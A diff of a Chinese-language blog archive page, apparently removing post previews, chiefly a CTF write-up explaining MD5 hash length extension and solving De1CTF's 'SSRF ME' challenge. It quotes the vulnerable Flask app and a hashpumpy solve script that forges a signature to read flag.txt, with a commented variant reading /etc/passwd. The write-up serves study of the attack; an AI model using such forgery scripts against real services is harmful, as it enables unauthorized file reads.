@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>Archive - Polgry&#39;s Blog</title>
+  <title>Archive：2019/10 - Polgry&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="description" content="Polgry&#39;s blog3">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -14,7 +14,7 @@
   <meta name="description" content="Polgry&apos;s blog3">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Polgry&#39;s Blog">
-<meta property="og:url" content="https://polgry.github.io/archives/index.html">
+<meta property="og:url" content="https://polgry.github.io/archives/2019/10/index.html">
 <meta property="og:site_name" content="Polgry&#39;s Blog">
 <meta property="og:description" content="Polgry&apos;s blog3">
 <meta property="og:locale" content="en">
@@ -28,7 +28,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1571970697859">
+  <link rel="stylesheet" href="/css/style.css?v=1571970697954">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -209,222 +209,6 @@
         </article>
     </div>
     
-    <div class="nexmoe-post">
-        <a href="/2019/09/10/test/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg" alt="check">
-                
-                <h1>check</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月10日</a>
-            <a><i class="nexmoefont icon-areachart"></i>1 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-        </div>
-        <article>
-            
-            <p>check</p>
-
-            
-        </article>
-    </div>
-    
-    <div class="nexmoe-post">
-        <a href="/2019/09/08/2/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg" alt="哈希长度扩展">
-                
-                <h1>哈希长度扩展</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月08日</a>
-            <a><i class="nexmoefont icon-areachart"></i>1.3k 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
-            
-            
-        </div>
-        <article>
-            
-            <h1 id="哈希长度扩展攻击学习："><a href="#哈希长度扩展攻击学习：" class="headerlink" title="哈希长度扩展攻击学习："></a>哈希长度扩展攻击学习：</h1><p>之前做题遇到过好好几次hash长度扩展攻击，每次遇到就扔给队友…这次正好借助Crypto的机会，补上。<br>先简单一句话讲一下哈希长度扩展攻击能干什么：</p>
-<p>已知一个哈希值hash(key|s|padding)，在不知道key的情况下,可以构造出其他的hash(key|s|padding|else)</p>
-<hr>
-<h3 id="0X1摘要算法实现过程"><a href="#0X1摘要算法实现过程" class="headerlink" title="0X1摘要算法实现过程"></a><strong>0X1</strong>摘要算法实现过程</h3><p>以MD5为例，理解一下，Hash算法过程</p>
-<p>以这个流程图为例MD5计算过程分为以下几步：<br>•    第一步把消息进行分组，每组64 byte（512bit），<br>•    第二步不足64byte 的部分会用padding补位，补位是使每一个分组均为512位<br>•    第三步每一个分组最后的8byte表示的是补充前的消息长度，在补位之后，小段存储，高放高，低放低。如果有一种情况,消息长度是大于64 位的 则取低64bit<br>示意图见右上角部分</p>
-<p>这是每一个分组的构成<br>ps:这里单独讲一下第二步补位的部分，<br>消息补位是使得其长度在对 512 取模后的值为 448（512-8*8）。也就是说，len(message) mod(512) == 448。补位二进制表示是在消息的后面加上一个1，后面跟着 n 个0，直到 len(message) mod (512) == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息进行补位到 448 bit，也就是 56 byte。<br>•    第四步计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit 的消息（即64 byte ）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p>
-<pre><code>A=0x67452301
-B=0xefcdab89
-C=0x98badcfe
-D=0x10325476</code></pre><p>经过一次消息再要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。     一轮一轮，上一个分组的结果进入下一轮运算。<br>这样已知一个哈希值hash(key|s|padding)，  可以构造出其他的hash(key|s|padding|else)<br>用hash(key|s|padding) 作为矢量，进入下一个分组，计算下一个hash<br>位数问题，爆破….</p>
-<h3 id="0X哈希长度拓展攻击-Hash-Length-Extension-Attacks-的实现"><a href="#0X哈希长度拓展攻击-Hash-Length-Extension-Attacks-的实现" class="headerlink" title="0X哈希长度拓展攻击(Hash Length Extension Attacks)的实现"></a>0X哈希长度拓展攻击(Hash Length Extension Attacks)的实现</h3><p>下面用De1CTF 的SSRF ME 来讲解一下<br>审计源码：</p>
-<pre><code>#! /usr/bin/env python
-#encoding=utf-8
-from flask import Flask
-from flask import request
-import socket
-import hashlib
-import urllib
-import sys
-import os
-import json
-reload(sys)
-sys.setdefaultencoding(&#39;latin1&#39;)
-
-app = Flask(__name__)
-
-secert_key = os.urandom(16)
-
-
-class Task:
-
-    def __init__(self, action, param, sign, ip):
-        self.action = action
-        self.param = param
-        self.sign = sign
-        self.sandbox = md5(ip)
-        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
-            os.mkdir(self.sandbox)
-
-    def Exec(self):
-        result = {}
-        result[&#39;code&#39;] = 500
-        if (self.checkSign()):
-            if &quot;scan&quot; in self.action:
-                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
-                resp = scan(self.param)
-                if (resp == &quot;Connection Timeout&quot;):
-                    result[&#39;data&#39;] = resp
-                else:
-                    print resp
-                    tmpfile.write(resp)
-                    tmpfile.close()
-                result[&#39;code&#39;] = 200
-            if &quot;read&quot; in self.action:
-                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
-                result[&#39;code&#39;] = 200
-                result[&#39;data&#39;] = f.read()
-            if result[&#39;code&#39;] == 500:
-                result[&#39;data&#39;] = &quot;Action Error&quot;
-        else:
-            result[&#39;code&#39;] = 500
-            result[&#39;msg&#39;] = &quot;Sign Error&quot;
-        return result
-
-    def checkSign(self):
-        if (getSign(self.action, self.param) == self.sign):
-            return True
-        else:
-            return False
-
-
-#generate Sign For Action Scan.
-@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def geneSign():
-    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-    action = &quot;scan&quot;
-    return getSign(action, param)
-
-
-@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
-def challenge():
-    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
-    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
-    ip = request.remote_addr
-    if(waf(param)):
-        return &quot;No Hacker!!!!&quot;
-    task = Task(action, param, sign, ip)
-    return json.dumps(task.Exec())
-@app.route(&#39;/&#39;)
-def index():
-    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
-
-
-def scan(param):
-    socket.setdefaulttimeout(1)
-    try:
-        return urllib.urlopen(param).read()[:50]
-    except:
-        return &quot;Connection Timeout&quot;
-
-
-
-def getSign(action, param):
-    return hashlib.md5(secert_key + param + action).hexdigest()
-
-
-def md5(content):
-    return hashlib.md5(content).hexdigest()
-
-
-def waf(param):
-    check=param.strip().lower()
-    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
-        return True
-    else:
-        return False
-
-
-if __name__ == &#39;__main__&#39;:
-    app.debug = False
-    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><p>可以看到三个路由</p>
-<p>/:  首页 获取源码<br>/geneSign：获取param参数，结合预设的action scan来调用getSign 生成签名，<br>/Delta： 从cookie 里获取action 和sign，再获取param参数，结合ip构造一个Task类对象，再以json返回其Exec方法执行的结果</p>
-<p>看到 Task 类的 Exec 方法<br>先看 action 里有没有 scan，有的话就调用 scan 方法来读取内容并写到沙盒下的 result.txt 文件。</p>
-<ul>
-<li>读取 flag.txt 到 result.txt。</li>
-<li>展示 result.txt 的内容。</li>
-</ul>
-<p>这里算 md5 时 param，action 可控，并且 action 在最后，这样我们就可以利用哈希长度扩展攻击，在 action 后面拼接上我们想要的东西，并且预测出拼接之后的 md5。这里我们就可以在 scan 后面拼上 read 了。</p>
-<p>贴个网上的wp</p>
-<pre><code>import hashpumpy
-import requests
-import urllib.parse
-
-url = &#39;flag.txt&#39;
-# url = &#39;local-file:/etc/passwd&#39;
-r = requests.get(&#39;http://web68.buuoj.cn/geneSign&#39;, params={&#39;param&#39;: url})
-sign = r.text
-hash_sign = hashpumpy.hashpump(sign, url + &#39;scan&#39;, &#39;read&#39;, 16)
-
-r = requests.get(&#39;http://web68.buuoj.cn/De1ta&#39;, params={&#39;param&#39;: url}, cookies={
-    &#39;sign&#39;: hash_sign[0],
-    &#39;action&#39;: urllib.parse.quote(hash_sign[1][len(url):])
-})
-
-print(r.text)</code></pre>
-            
-        </article>
-    </div>
-    
-    <div class="nexmoe-post">
-        <a href="/2019/09/08/qweqwe/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                <img src="http://imgsrc.baidu.com/forum/pic/item/268709087bf40ad1beb3fbb65e2c11dfa8ecce08.jpg" alt="第一篇log">
-                
-                <h1>第一篇log</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月08日</a>
-            <a><i class="nexmoefont icon-areachart"></i>32 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-        </div>
-        <article>
-            
-            <p>今天终于把blog在本地搭好了，希望以后多学东西，多写东西，然后有内容输出吧。</p>
-
-            
-        </article>
-    </div>
-    
 </section>
 
     </div>
@@ -442,7 +226,7 @@ print(r.text)</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1571970697864"></script>
+<script src="/js/app.js?v=1571970697960"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
